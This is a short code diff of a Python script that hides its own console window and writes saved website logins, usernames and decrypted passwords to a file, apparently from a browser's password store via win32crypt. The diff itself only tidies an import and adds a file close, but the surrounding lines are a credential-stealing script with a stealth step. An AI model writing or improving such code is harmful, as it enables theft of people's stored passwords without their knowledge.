@@ -1,9 +1,9 @@
 from os import getenv
 import sqlite3
 import win32crypt
+import win32console, win32gui
 
 #Lets hide the console
-import win32console, win32gui
 window = win32console.GetConsoleWindow()
 win32gui.ShowWindow(window, 0)
 
@@ -21,6 +21,4 @@ for result in cursor.fetchall():
         fp.write('\nThe website is '+result[0])
         fp.write('\nThe Username is '+result[1])
         fp.write('\n The password is ' + str(password))
-
-
-
+fp.close()
